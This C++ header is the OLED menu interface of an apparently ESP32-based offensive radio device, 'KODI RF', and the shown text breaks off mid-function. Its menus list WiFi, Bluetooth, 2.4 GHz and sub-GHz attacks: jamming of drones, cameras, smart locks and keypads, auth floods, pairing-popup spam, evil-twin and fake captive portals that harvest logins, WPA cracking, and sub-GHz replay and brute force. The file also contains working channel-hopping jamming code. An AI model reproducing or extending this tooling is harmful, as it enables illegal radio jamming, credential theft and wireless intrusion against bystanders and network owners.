#pragma once
// ############################################################################
//  gg_ui.h  -  KODI RF CONTROLLER  /  OLED UI (four-button, beginner-friendly)
//
//  Layout is built for the common two-colour OLED (top ~16px YELLOW, rest BLUE
//  with a dead gap at the seam): the header lives in the yellow band, and all
//  content starts at y=18 so nothing lands on the seam.
//
//  UP/DOWN move + change values, SELECT confirms/edits/sends, BACK goes back
//  (hold BACK = HOME). Every menu shows a one-line plain-English hint.
// ############################################################################

#include <Arduino.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include "gg_config.h"
#include "gg_input.h"
#include "gg_audio.h"
#include "gg_nrf.h"
#include "gg_store.h"
#include "gg_boot.h"
#include "gg_detect.h"
#include "gg_wifi_tx.h"
#include "gg_ble_tx.h"
#include "gg_portal.h"
#include "gg_crack.h"
#include "gg_cc1101.h"
#include "gg_cc1101_tools.h"
#include "gg_leds.h"
#include "gg_oled2.h"

static Adafruit_SSD1306 ggOled(128, 64, &Wire, -1);
static bool ggOledOk = false;

// ---- layout (dodge the yellow/blue seam at ~y16) ----
#define GG_ROW0  18
#define GG_ROWH  9
#define GG_ROWS  4

// ===== app state ===========================================================
static GgNrfProfile gNrfA, gNrfB;
static GgSettings   gSet;
static uint8_t  gHotActive = 0;
static uint32_t gTxCount = 0, gAckOk = 0, gTxFail = 0, gRxCount = 0;
static bool     gLastOk = false, gBeaconOn = false, gCarrierOn = false, gScanPause = false;
static uint32_t gBeaconLast = 0, gPhase = 0;
static uint16_t gBurstLeft = 0; static uint32_t gBurstNext = 0;
static bool     gAutoFire = false;   // "Load & send" asks the SEND screen to fire on entry
static uint8_t  gRxLast[GG_PAYLOAD_MAX], gRxLen = 0, gRxPipe = 0;
static uint8_t  gNrfScan[126];
static GgWifiTxCfg gWifiTx;
static GgBleTxCfg  gBleTx;
static uint32_t gWifiTxStartMs = 0;
static bool     gWifiFloodMode = false;

// CC1101 state
static GgCcProfile gCcA, gCcB;
static GgCcProfile* gCcCfg = &gCcA;
static uint32_t gCcTxCount = 0;
static uint16_t gCcBurstLeft = 0;
static uint32_t gCcBurstNext = 0;
static uint8_t  gCcRxLast[GG_CC_PAYLOAD_MAX], gCcRxLen = 0;
static uint32_t gCcRxCount = 0;
static GgCcRecording gCcRec;
static bool gCcRecLoaded = false;

// Batch 2 state
static uint16_t gTimeBombDelay = 30;
static uint32_t gTimeBombStartMs = 0;
static bool     gTimeBombArmed = false;
static char     gGeofenceSsid[33] = "";
static uint8_t  gGeofenceCh = 1;
static bool     gGeofenceFound = false;
static uint32_t gGeofenceLastScan = 0;
static uint8_t  gChainPhase = 0;
static uint32_t gChainPhaseMs = 0;
static bool     gChainWifiUp = false, gChainBleUp = false;
static uint8_t  gProgPwr = 0;
static uint32_t gProgLastRamp = 0;
static bool     gProgWifiUp = false, gProgBleUp = false;
static uint8_t  gAtkTimerType = 0;
static uint16_t gAtkTimerSec = 30;
static uint32_t gAtkTimerStart = 0;
static bool     gAtkTimerArmed = false;
static uint8_t  gHeatData[14];
static uint8_t  gHeatCh = 0;
static volatile uint32_t gPktRateCnt = 0; static uint32_t gPktRateLastMs = 0;
static uint16_t gPktRatePerSec = 0;
static bool     gPktRateOn = false;

// ---- Screen 2 (SWAP) state — defined in gg_oled2.h ----
#define GG_S2_IDLE_MS 10000

// ---- grid HOME state ----
static uint8_t gGridPage = 0;
static uint8_t gGridSel  = 0;

static void ggPktRateSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  (void)buf; (void)type;
  gPktRateCnt++;
}

// ===== display + helpers ===================================================
static inline bool ggOledBegin() {
  Wire.begin(GG_PIN_SDA, GG_PIN_SCL, GG_I2C_HZ);
  delay(20);
  ggOledOk = ggOled.begin(SSD1306_SWITCHCAPVCC, GG_OLED_ADDR);
  if (!ggOledOk) ggOledOk = ggOled.begin(SSD1306_SWITCHCAPVCC, 0x3D);
  if (ggOledOk) {
    ggOled.ssd1306_command(0x8D); ggOled.ssd1306_command(0x14);
    ggOled.ssd1306_command(0x81); ggOled.ssd1306_command(0xFF);
    ggOled.clearDisplay(); ggOled.display();
  }
  return ggOledOk;
}
// header sits fully inside the yellow band (y0..10); title left, radio dots right
static inline void ggHeader(const char* title) {
  ggOled.fillRect(0, 0, 128, 11, SSD1306_WHITE);
  ggOled.setTextColor(SSD1306_BLACK); ggOled.setTextSize(1);
  ggOled.setCursor(2, 2); ggOled.print(title);
  ggOled.setTextColor(SSD1306_WHITE);
}
// menu with a one-line hint for the highlighted row
static inline void ggMenu(const char* title, const char* const items[], int n, int sel, int& top, const char* hint) {
  ggOled.clearDisplay();
  ggHeader(title);
  if (sel < top) top = sel;
  if (sel > top + GG_ROWS - 1) top = sel - (GG_ROWS - 1);
  if (top < 0) top = 0;
  for (int i = 0; i < GG_ROWS; i++) {
    int idx = top + i; if (idx >= n) break;
    int y = GG_ROW0 + i * GG_ROWH;
    if (idx == sel) { ggOled.fillRect(0, y - 1, 128, GG_ROWH, SSD1306_WHITE); ggOled.setTextColor(SSD1306_BLACK); }
    else ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(3, y); ggOled.print(items[idx]);
  }
  ggOled.setTextColor(SSD1306_WHITE);
  if (top > 0)            ggOled.fillTriangle(123, 18, 127, 18, 125, 15, SSD1306_WHITE);
  if (top + GG_ROWS < n)  ggOled.fillTriangle(123, 52, 127, 52, 125, 55, SSD1306_WHITE);
  if (hint && hint[0]) { ggOled.drawFastHLine(0, 54, 128, SSD1306_WHITE); ggOled.setCursor(2, 56); ggOled.print(hint); }
  ggOled.display();
}
// Compact TX activity mark: gecko with one expanding ring. Kept within a
// ~15px radius so it never sweeps into the text column (which starts at x=34).
static inline void ggBurstMark(int cx, int cy, int phase) {
  int r = 8 + (phase % 7);
  ggOled.drawCircle(cx, cy, r, SSD1306_WHITE);
  ggDrawGecko(ggOled, cx, cy, 1, SSD1306_WHITE);
}
static inline void ggStepU8(uint8_t& v, int dir, int lo, int hi) {
  int x = (int)v + dir; if (x < lo) x = hi; if (x > hi) x = lo; v = (uint8_t)x;
}
static inline void ggStepU16(uint16_t& v, int dir, int step, int lo, int hi) {
  int x = (int)v + dir*step; if (x < lo) x = lo; if (x > hi) x = hi; v = (uint16_t)x;
}
static inline void ggCycle(uint8_t& v, uint8_t n, int dir) { v = (uint8_t)((v + n + dir) % n); }
// Compact a counter so it never overruns its field: <100k as-is, then 123k, 1.2M.
static inline const char* ggFmtCount(uint32_t v) {
  static char b[10];
  if (v < 100000UL)        snprintf(b,sizeof(b),"%lu",(unsigned long)v);
  else if (v < 1000000UL)  snprintf(b,sizeof(b),"%luk",(unsigned long)(v/1000UL));
  else                     snprintf(b,sizeof(b),"%lu.%luM",(unsigned long)(v/1000000UL),(unsigned long)((v%1000000UL)/100000UL));
  return b;
}

// ===== nRF mode orchestration ==============================================
static inline RF24& ggNrfActive() { return gHotActive ? ggNrfB : ggNrfA; }
static inline bool  ggNrfActiveP() { return gHotActive ? ggNrfPresentB : ggNrfPresentA; }
static inline RF24& ggNrfTool()  { return ggNrfPresentA ? ggNrfA : ggNrfB; }
static inline bool  ggNrfToolP() { return ggNrfPresentA || ggNrfPresentB; }
static inline void ggNrfConfigureForTx() {
  switch (gSet.nrfMode) {
    case GG_NM_PAIR:
      if (ggNrfPresentA) ggNrfConfigTx(ggNrfA, gNrfA);
      if (ggNrfPresentB) ggNrfConfigRx(ggNrfB, gNrfA);
      break;
    case GG_NM_DUALTX:
      if (ggNrfPresentA) { ggNrfConfigTx(ggNrfA, gNrfA); ggNrfA.setAutoAck(false); }
      if (ggNrfPresentB) { ggNrfConfigTx(ggNrfB, gNrfB); ggNrfB.setAutoAck(false); }
      break;
    case GG_NM_HOTSWAP:
      if (ggNrfActiveP()) { ggNrfConfigTx(ggNrfActive(), gNrfA); ggNrfActive().setAutoAck(false); }
      if (gHotActive == 0 && ggNrfPresentB) ggNrfB.powerDown();
      if (gHotActive == 1 && ggNrfPresentA) ggNrfA.powerDown();
      break;
  }
}
static inline bool ggNrfSendOne() {
  bool ok = false;
  switch (gSet.nrfMode) {
    case GG_NM_PAIR:   if (ggNrfPresentA) ok = ggNrfTxOnce(ggNrfA, gNrfA, gTxCount); break;
    case GG_NM_DUALTX: {
      bool a = ggNrfPresentA ? ggNrfTxOnce(ggNrfA, gNrfA, gTxCount) : false;
      bool b = ggNrfPresentB ? ggNrfTxOnce(ggNrfB, gNrfB, gTxCount) : false;
      ok = a || b; break;
    }
    case GG_NM_HOTSWAP: if (ggNrfActiveP()) ok = ggNrfTxOnce(ggNrfActive(), gNrfA, gTxCount); break;
  }
  gTxCount++; gLastOk = ok;
  if (gSet.nrfMode == GG_NM_PAIR && gNrfA.autoAck) { if (ok) gAckOk++; else gTxFail++; }
  return ok;
}
static inline void ggNrfPollPair() {
  if (gSet.nrfMode != GG_NM_PAIR || !ggNrfPresentB) return;
  uint8_t len = 0, pipe = 0;
  if (ggNrfRxPoll(ggNrfB, gRxLast, &len, &pipe)) { gRxLen = len; gRxPipe = pipe; gRxCount++; }
}

// ===== screen machine ======================================================
enum GgScreen : uint8_t {
  GS_HOME=0, GS_NRF, GS_ADV, GS_MODES, GS_COP_SCAN, GS_TRACKER_SCAN,
  GS_NRF_TX, GS_NRF_BEACON, GS_NRF_CARRIER,
  GS_NRF_SCAN, GS_NRF_RX, GS_NPROF, GS_PROFACT, GS_SETTINGS, GS_SYSTEM,
  GS_HELP, GS_HELPPAGE, GS_BYTES, GS_PAYLIB, GS_PAYACT,
  GS_WIFI_TX, GS_WIFI_TX_RUN, GS_WIFI_PICK, GS_BLE_TX, GS_BLE_TX_RUN, GS_BLE_SCAN,
  GS_JAM_PICK, GS_JAM_RUN, GS_KPAD_RUN, GS_RAD_PICK, GS_RAD_RUN, GS_SPAM_RUN, GS_BLESPAM_RUN,
  GS_EVIL_PICK, GS_EVIL_RUN, GS_DRONE_RUN, GS_PROBE_RUN, GS_CRED_VIEW,
  GS_RICK_MENU, GS_RICK_RUN, GS_SPEAKER_RUN, GS_SLOCK_RUN, GS_NET_AUDIT, GS_NET_DETAIL,
  GS_AUTH_PICK, GS_AUTH_RUN, GS_FUZZ_RUN, GS_QUIET_PICK, GS_QUIET_RUN,
  GS_CLONE_PICK, GS_CLONE_RUN, GS_FARM_RUN, GS_TIMEBOMB, GS_DEAUTH_DET,
  GS_GEOFENCE, GS_MAC_HARVEST, GS_PROX_ALERT, GS_UUID_SCAN, GS_BLE_RANGE,
  GS_CHAIN_RUN, GS_PROG_JAM, GS_AUTO_TARGET,
  GS_HEATMAP, GS_BAND_OCC, GS_PKTRATE, GS_ATK_TIMER,
  GS_CRACK_PICK, GS_CRACK_CAP, GS_CRACK_DONE,
  GS_BLACKOUT,
  // ---- category sub-menus ----
  GS_CAT_WIFI, GS_CAT_BLE, GS_CAT_NRF, GS_CAT_COMBO,
  GS_CAT_RECON, GS_CAT_EXPLOIT, GS_CAT_TOOLS, GS_CAT_SYSTEM,
  // ---- new tool screens ----
  GS_WIFIBLE_RUN, GS_BLENRF_RUN, GS_NRF_JAM,
  GS_HIDDEN_SCAN, GS_CAMERA_JAM, GS_SIGNAL_METER,
  GS_R40T_MODE,
  // ---- CC1101 sub-GHz screens ----
  GS_CAT_CC1101, GS_CAT_SUBGHZ,
  GS_CC_TX, GS_CC_TX_RUN, GS_CC_RX,
  GS_CC_SCAN, GS_CC_RSSI, GS_CC_JAM,
  GS_CC_REC, GS_CC_REPLAY, GS_CC_BRUTE,
  GS_CC_CW, GS_CC_PROF, GS_CC_PROFACT,
};
static uint8_t gScreen = GS_HOME;
static uint8_t gStack[10]; static uint8_t gStackTop = 0;
static uint8_t gSel = 0; static int gTop = 0; static bool gRunInit = false;
static bool    gEditing = false;
static uint8_t* gBBuf=nullptr; static uint8_t gBN=0, gBIdx=0; static const char* gBTitle="BYTES"; static bool gBAscii=false;
static uint8_t* gBLenPtr=nullptr; static uint8_t gBLenMax=GG_PAYLOAD_MAX;  // if set, editor can grow length
static uint8_t  gSlot = 0, gHelpSel = 0, gPaySlot = 0;
static GgNrfProfile* gNrfCfg = &gNrfA;

static inline void ggGo(uint8_t s) {
  if (gStackTop < sizeof(gStack)) gStack[gStackTop++] = gScreen;
  gScreen = s; gSel = 0; gTop = 0; gRunInit = false; gEditing = false;
}
static inline void ggBack() {
  if (gStackTop > 0) gScreen = gStack[--gStackTop]; else gScreen = GS_HOME;
  gSel = 0; gTop = 0; gRunInit = false; gEditing = false;
}
static inline void ggHome() { gStackTop = 0; gScreen = GS_HOME; gSel = 0; gTop = 0; gRunInit = false; gEditing = false; }
// ---- flood nRF helpers (must be before ggStopTx) ----
// nRF flood state: each radio hops across the target WiFi channel's 22MHz band,
// blasting 32-byte random packets at 2Mbps for ~2MHz modulated bandwidth per hop.
static uint8_t ggFloodNrfChLo = 0;
static uint8_t ggFloodNrfChHi = 125;
static uint8_t ggFloodNrfPosA = 0;
static uint8_t ggFloodNrfPosB = 0;

static inline void ggFloodNrfStart(uint8_t wifiCh) {
  uint8_t center = ggWifiChToNrf(wifiCh);
  ggFloodNrfChLo = (center > 3) ? center - 3 : 0;
  ggFloodNrfChHi = (center + 3 <= 125) ? center + 3 : 125;
  ggFloodNrfPosA = ggFloodNrfChLo;
  ggFloodNrfPosB = center;
  if (ggNrfPresentA) ggNrfNoiseBegin(ggNrfA, ggFloodNrfPosA);
  if (ggNrfPresentB) ggNrfNoiseBegin(ggNrfB, ggFloodNrfPosB);
  ggFloodNrfActive = true;
}
static inline void ggFloodNrfStop() {
  if (!ggFloodNrfActive) return;
  if (ggNrfPresentA) ggNrfNoiseEnd(ggNrfA);
  if (ggNrfPresentB) ggNrfNoiseEnd(ggNrfB);
  ggFloodNrfActive = false;
}
// pump nRF noise — blast packet, flush, hop channel. Rate-limited to avoid
// overwhelming the SPI bus (which shares pins with both radios).
static uint32_t ggFloodNrfLastMs = 0;
static inline void ggFloodNrfPump() {
  if (!ggFloodNrfActive) return;
  uint32_t now = millis();
  if (now - ggFloodNrfLastMs < 1) return;
  ggFloodNrfLastMs = now;
  if (ggNrfPresentA) {
    ggNrfNoiseBlast(ggNrfA);
    ggNrfA.txStandBy();
    ggFloodNrfPosA++;
    if (ggFloodNrfPosA > ggFloodNrfChHi) ggFloodNrfPosA = ggFloodNrfChLo;
    ggNrfA.setChannel(ggFloodNrfPosA);
  }
  if (ggNrfPresentB) {
    ggNrfNoiseBlast(ggNrfB);
    ggNrfB.txStandBy();
    ggFloodNrfPosB++;
    if (ggFloodNrfPosB > ggFloodNrfChHi) ggFloodNrfPosB = ggFloodNrfChLo;
    ggNrfB.setChannel(ggFloodNrfPosB);
  }
}
static inline void ggBleFloodNrfStart() {
  ggFloodNrfChLo = 0;
  ggFloodNrfChHi = 83;
  ggFloodNrfPosA = 0;
  ggFloodNrfPosB = 42;
  if (ggNrfPresentA) ggNrfNoiseBegin(ggNrfA, 0);
  if (ggNrfPresentB) ggNrfNoiseBegin(ggNrfB, 42);
  ggFloodNrfActive = true;
}
static inline void ggStopTx() {
  gBeaconOn = false; gBurstLeft = 0;
  if (gCarrierOn) { if (ggNrfToolP()) ggNrfCarrierOff(ggNrfTool()); gCarrierOn = false; }
  ggFloodNrfStop();
  if (ggNrfPresentA) ggNrfA.stopListening();
  if (ggNrfPresentB) ggNrfB.stopListening();
  if (ggPortalActive) ggPortalEnd();
  if (ggProbeActive)  ggProbeEnd();
  ggWifiTxPaused = false;
  if (ggWifiTxRun)    ggWifiTxEnd();
  if (ggCopRunning)   ggCopScanEnd();
  if (ggTrkBleReady)  ggTrkScanEnd();
  ggBleFloodMode = false;
  if (ggBleTxActive) ggBleTxEnd();
  else if (ggBleTxReady) { delay(50); BLEDevice::deinit(false); delay(100); ggBleTxReady=false; }
}
static inline void ggOpenBytes(uint8_t* b, uint8_t n, const char* t, bool ascii,
                               uint8_t* lenPtr=nullptr, uint8_t lenMax=GG_PAYLOAD_MAX) {
  gBBuf=b; gBN=(n>GG_PAYLOAD_MAX)?GG_PAYLOAD_MAX:n; if(gBN<1)gBN=1; gBIdx=0; gBTitle=t; gBAscii=ascii;
  gBLenPtr=lenPtr; gBLenMax=(lenMax>GG_PAYLOAD_MAX)?GG_PAYLOAD_MAX:lenMax;
  ggGo(GS_BYTES);
}
static inline void ggMove(int lo, int hi) {
  if (gEv.up)   ggStepU8(gSel, -1, lo, hi);
  if (gEv.down) ggStepU8(gSel, +1, lo, hi);
}

// ---------------------------------------------------------------- GRID HOME
static inline void ggGrid(const char* title, const char* const labels[], uint8_t sel, uint8_t page, uint8_t pages) {
  ggOled.clearDisplay();
  ggHeader(title);
  for (uint8_t i = 0; i < 4; i++) {
    int x = (i & 1) ? 66 : 2;
    int y = (i >> 1) ? 35 : 13;
    if (i == sel) {
      ggOled.fillRoundRect(x, y, 60, 19, 3, SSD1306_WHITE);
      ggOled.setTextColor(SSD1306_BLACK);
    } else {
      ggOled.drawRoundRect(x, y, 60, 19, 3, SSD1306_WHITE);
      ggOled.setTextColor(SSD1306_WHITE);
    }
    int tw = strlen(labels[i]) * 6;
    ggOled.setCursor(x + (60 - tw) / 2, y + 6);
    ggOled.print(labels[i]);
  }
  ggOled.setTextColor(SSD1306_WHITE);
  ggOled.drawFastHLine(0, 54, 128, SSD1306_WHITE);
  char pg[12]; snprintf(pg, sizeof(pg), "< %d/%d >", page + 1, pages);
  int pw = strlen(pg) * 6;
  ggOled.setCursor((128 - pw) / 2, 56); ggOled.print(pg);
  ggOled.display();
}

static const char* const GG_GRID_P0[] = { "WiFi ATK", "BLE ATK", "nRF Radio", "CC1101" };
static const char* const GG_GRID_P1[] = { "Combo ATK", "Sub-GHz", "Recon", "Exploits" };
static const char* const GG_GRID_P2[] = { "Tools", "System", "Profiles", "Help" };
static const char* const* const GG_GRID_PAGES[] = { GG_GRID_P0, GG_GRID_P1, GG_GRID_P2 };
static const uint8_t GG_GRID_CAT[] = {
  GS_CAT_WIFI, GS_CAT_BLE, GS_CAT_NRF, GS_CAT_CC1101,
  GS_CAT_COMBO, GS_CAT_SUBGHZ, GS_CAT_RECON, GS_CAT_EXPLOIT,
  GS_CAT_TOOLS, GS_CAT_SYSTEM, GS_NPROF, GS_HELP
};

static inline void ggScreenHome() {
  if (gEv.down) {
    if (gGridSel < 3) gGridSel++; else { gGridSel = 0; gGridPage = (gGridPage + 1) % 3; }
  }
  if (gEv.up) {
    if (gGridSel > 0) gGridSel--; else { gGridSel = 3; gGridPage = (gGridPage + 3 - 1) % 3; }
  }
  if (gEv.sel) { ggGo(GG_GRID_CAT[gGridPage * 4 + gGridSel]); return; }
  ggGrid("KODI RF", GG_GRID_PAGES[gGridPage], gGridSel, gGridPage, 3);
}

// ---------------------------------------------------------------- CATEGORY: WiFi ATK
static inline void ggScreenCatWifi() {
  static const char* const IT[] = {
    "WiFi TX", "Beacon Spam", "WiFi Rickroll", "Auth Flood",
    "WiFi Fuzzer", "Quiet Storm", "BSSID Clone", "Fake AP Farm",
    "WiFi Time Bomb", "WiFi Crack"
  };
  static const char* const HI[] = {
    "Flood a WiFi channel", "Flood fake SSIDs+NAV", "Custom SSID broadcast",
    "Exhaust AP auth table", "Random malformed WiFi", "802.11h silence atk",
    "Spoof exact BSSID", "12 persistent fake AP", "Delayed auto-jam",
    "Capture+crack WPA key"
  };
  ggMove(0, 9);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    switch (gSel) {
      case 0: ggGo(GS_WIFI_TX); break;
      case 1: ggGo(GS_SPAM_RUN); break;
      case 2: ggGo(GS_RICK_MENU); break;
      case 3: ggGo(GS_AUTH_PICK); break;
      case 4: ggGo(GS_FUZZ_RUN); break;
      case 5: ggGo(GS_QUIET_PICK); break;
      case 6: ggGo(GS_CLONE_PICK); break;
      case 7: ggGo(GS_FARM_RUN); break;
      case 8: ggGo(GS_TIMEBOMB); break;
      case 9: ggGo(GS_CRACK_PICK); break;
    } return;
  }
  ggMenu("WiFi ATK", IT, 10, gSel, gTop, HI[gSel]);
}

// ---------------------------------------------------------------- CATEGORY: BLE ATK
static inline void ggScreenCatBle() {
  static const char* const IT[] = {
    "BLE TX", "Apple Spam", "FastPair Spam", "Samsung Spam",
    "SwiftPair Spam", "Name Flood", "All Protocols", "Speaker Jam",
    "Smart Lock Buzz"
  };
  static const char* const HI[] = {
    "BLE advert broadcast", "Apple device popups", "Android pair popups",
    "Samsung Buds popups", "Windows pair popups", "Random BLE names",
    "Cycle all spam types", "Disrupt BT speakers", "Jam BLE smart locks"
  };
  ggMove(0, 8);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    switch (gSel) {
      case 0: ggGo(GS_BLE_TX); break;
      case 1: ggBleSpamProto = GG_BSP_APPLE; ggGo(GS_BLESPAM_RUN); break;
      case 2: ggBleSpamProto = GG_BSP_FASTPAIR; ggGo(GS_BLESPAM_RUN); break;
      case 3: ggBleSpamProto = GG_BSP_SAMSUNG; ggGo(GS_BLESPAM_RUN); break;
      case 4: ggBleSpamProto = GG_BSP_SWIFTPAIR; ggGo(GS_BLESPAM_RUN); break;
      case 5: ggBleSpamProto = GG_BSP_NAMES; ggGo(GS_BLESPAM_RUN); break;
      case 6: ggBleSpamProto = GG_BSP_ALL; ggGo(GS_BLESPAM_RUN); break;
      case 7: ggGo(GS_SPEAKER_RUN); break;
      case 8: ggGo(GS_SLOCK_RUN); break;
    } return;
  }
  ggMenu("BLE ATK", IT, 9, gSel, gTop, HI[gSel]);
}

// ---------------------------------------------------------------- CATEGORY: nRF Radio
static inline void ggScreenCatNrf() {
  static const char* const IT[] = {
    "Transmit", "More Modes", "Keypad Buster", "nRF Jam"
  };
  static const char* const HI[] = {
    "Send data on 2.4GHz", "Beacon, range, listen", "Disrupt 2.4G keypads",
    "Full nRF spectrum jam"
  };
  ggMove(0, 3);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    switch (gSel) {
      case 0: gNrfCfg = &gNrfA; ggGo(GS_NRF); break;
      case 1: ggGo(GS_MODES); break;
      case 2: ggGo(GS_KPAD_RUN); break;
      case 3: ggGo(GS_NRF_JAM); break;
    } return;
  }
  ggMenu("nRF Radio", IT, 4, gSel, gTop, HI[gSel]);
}

// ---------------------------------------------------------------- CATEGORY: Combo ATK
static inline void ggScreenCatCombo() {
  static const char* const IT[] = {
    "Full Jam", "Radius Jammer", "Drone Jammer",
    "WiFi+BLE Flood", "BLE+nRF Flood",
    "Chain Attack", "Progressive Jam", "Auto-Target", "Blackout"
  };
  static const char* const HI[] = {
    "All radios MAX blast", "Jam all nearby APs", "Drop 2.4G drones",
    "WiFi & BLE together", "BLE & nRF together",
    "WiFi>BLE>nRF cycle", "Power ramp jam", "Scan+jam strongest",
    "Full band RF blackout"
  };
  ggMove(0, 8);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    switch (gSel) {
      case 0: ggGo(GS_JAM_PICK); break;
      case 1: ggGo(GS_RAD_PICK); break;
      case 2: ggGo(GS_DRONE_RUN); break;
      case 3: ggGo(GS_WIFIBLE_RUN); break;
      case 4: ggGo(GS_BLENRF_RUN); break;
      case 5: ggGo(GS_CHAIN_RUN); break;
      case 6: ggGo(GS_PROG_JAM); break;
      case 7: ggGo(GS_AUTO_TARGET); break;
      case 8: ggGo(GS_BLACKOUT); break;
    } return;
  }
  ggMenu("Combo ATK", IT, 9, gSel, gTop, HI[gSel]);
}

// ---------------------------------------------------------------- CATEGORY: Recon
static inline void ggScreenCatRecon() {
  static const char* const IT[] = {
    "Cop/Surv Scan", "Tracker Scan", "Deauth Detect",
    "Probe Harvest", "Network Audit", "MAC Harvest",
    "BLE Prox Alert", "UUID Scanner", "BLE Range",
    "Hidden Scanner", "Signal Meter"
  };
  static const char* const HI[] = {
    "WiFi surveillance", "BLE AirTag/Tile/etc", "Monitor for deauths",
    "Sniff probe requests", "Scan WiFi security", "Collect BLE MACs",
    "Alert device nearby", "Show BLE UUIDs", "BLE signal strength",
    "Find hidden networks", "WiFi RSSI bar graph"
  };
  ggMove(0, 10);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    switch (gSel) {
      case 0:  ggGo(GS_COP_SCAN); break;
      case 1:  ggGo(GS_TRACKER_SCAN); break;
      case 2:  ggGo(GS_DEAUTH_DET); break;
      case 3:  ggGo(GS_PROBE_RUN); break;
      case 4:  ggGo(GS_NET_AUDIT); break;
      case 5:  ggGo(GS_MAC_HARVEST); break;
      case 6:  ggGo(GS_PROX_ALERT); break;
      case 7:  ggGo(GS_UUID_SCAN); break;
      case 8:  ggGo(GS_BLE_RANGE); break;
      case 9:  ggGo(GS_HIDDEN_SCAN); break;
      case 10: ggGo(GS_SIGNAL_METER); break;
    } return;
  }
  ggMenu("Recon", IT, 11, gSel, gTop, HI[gSel]);
}

// ---------------------------------------------------------------- CATEGORY: Exploits
static inline void ggScreenCatExploit() {
  static const char* const IT[] = {
    "Evil Twin", "Coffee Portal", "Hotel Portal",
    "Update Portal", "WiFi Geofence", "Camera Jammer"
  };
  static const char* const HI[] = {
    "Clone AP+catch creds", "Coffee shop creds", "Hotel room+name",
    "Fake update prompt", "Alert when SSID near", "Jam WiFi cameras"
  };
  ggMove(0, 5);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    switch (gSel) {
      case 0: ggPortalType = GG_PT_DEFAULT; ggGo(GS_EVIL_PICK); break;
      case 1: ggPortalType = GG_PT_COFFEE; ggGo(GS_EVIL_PICK); break;
      case 2: ggPortalType = GG_PT_HOTEL; ggGo(GS_EVIL_PICK); break;
      case 3: ggPortalType = GG_PT_UPDATE; ggGo(GS_EVIL_PICK); break;
      case 4: ggGo(GS_GEOFENCE); break;
      case 5: ggGo(GS_CAMERA_JAM); break;
    } return;
  }
  ggMenu("Exploits", IT, 6, gSel, gTop, HI[gSel]);
}

// ---------------------------------------------------------------- CATEGORY: Tools
static inline void ggScreenCatTools() {
  static const char* const IT[] = {
    "WiFi Heatmap", "Band Occupancy", "Pkt Rate Graph",
    "Attack Timer", "Saved Creds", "R40T Mode"
  };
  static const char* const HI[] = {
    "Per-channel signal", "nRF spectrum view", "Live packet counter",
    "Countdown auto-jam", "View captured logins", "Control R40T display"
  };
  ggMove(0, 5);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    switch (gSel) {
      case 0: ggGo(GS_HEATMAP); break;
      case 1: ggGo(GS_BAND_OCC); break;
      case 2: ggGo(GS_PKTRATE); break;
      case 3: ggGo(GS_ATK_TIMER); break;
      case 4: ggGo(GS_CRED_VIEW); break;
      case 5: ggGo(GS_R40T_MODE); break;
    } return;
  }
  ggMenu("Tools", IT, 6, gSel, gTop, HI[gSel]);
}

// ---------------------------------------------------------------- CATEGORY: System
static inline void ggScreenCatSystem() {
  static const char* const IT[] = { "Saved Setups", "Settings", "Help & Guide", "Radio Status" };
  static const char* const HI[] = { "Load/save configs", "Volume & radio mode", "Learn how to use it", "All radio info" };
  ggMove(0, 3);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    switch (gSel) {
      case 0: gNrfCfg = &gNrfA; gSlot = 0; ggGo(GS_NPROF); break;
      case 1: ggGo(GS_SETTINGS); break;
      case 2: ggGo(GS_HELP); break;
      case 3: ggGo(GS_SYSTEM); break;
    } return;
  }
  ggMenu("System", IT, 4, gSel, gTop, HI[gSel]);
}

// ---------------------------------------------------------------- CATEGORY: CC1101
static inline void ggScreenCatCc1101() {
  static const char* const IT[] = {
    "CC1101 Transmit", "CC1101 Receive", "CC1101 Config B",
    "Saved CC Setups"
  };
  static const char* const HI[] = {
    "Sub-GHz packet TX", "Listen on frequency", "Edit CC1101-B settings",
    "Load/save CC configs"
  };
  ggMove(0, 3);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    switch (gSel) {
      case 0: gCcCfg = &gCcA; ggGo(GS_CC_TX); break;
      case 1: gCcCfg = &gCcA; ggGo(GS_CC_RX); break;
      case 2: gCcCfg = &gCcB; ggGo(GS_CC_TX); break;
      case 3: gSlot = 0; ggGo(GS_CC_PROF); break;
    } return;
  }
  ggMenu("CC1101", IT, 4, gSel, gTop, HI[gSel]);
}

// ---------------------------------------------------------------- CATEGORY: Sub-GHz ATK
static inline void ggScreenCatSubGhz() {
  static const char* const IT[] = {
    "Sub-GHz Jammer", "Freq Scanner", "RSSI Monitor",
    "Record Signal", "Replay Signal", "Brute Force",
    "Signal Generator"
  };
  static const char* const HI[] = {
    "Jam sub-GHz band", "Sweep freq range", "Live signal meter",
    "Capture OOK signal", "Replay recorded sig", "Sequential code TX",
    "CW tone for testing"
  };
  ggMove(0, 6);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    switch (gSel) {
      case 0: ggGo(GS_CC_JAM); break;
      case 1: ggGo(GS_CC_SCAN); break;
      case 2: ggGo(GS_CC_RSSI); break;
      case 3: ggGo(GS_CC_REC); break;
      case 4: ggGo(GS_CC_REPLAY); break;
      case 5: ggGo(GS_CC_BRUTE); break;
      case 6: ggGo(GS_CC_CW); break;
    } return;
  }
  ggMenu("Sub-GHz ATK", IT, 7, gSel, gTop, HI[gSel]);
}

// ---------------------------------------------------------------- CC1101 TX config
enum { CC_SEND=0, CC_FREQ, CC_MOD, CC_RATE, CC_PWR, CC_DATA, CC_LEN, CC_AMT, CC_GAP, CC_NAME, CC_CNT };
static const char* ggCcHint(int f) {
  switch (f) {
    case CC_SEND:  return "Fire the payload";
    case CC_FREQ:  return "Sub-GHz frequency";
    case CC_MOD:   return "ASK/FSK/GFSK/MSK";
    case CC_RATE:  return "Bits per second";
    case CC_PWR:   return "Output power dBm";
    case CC_DATA:  return "Edit your payload";
    case CC_LEN:   return "Bytes 1-61";
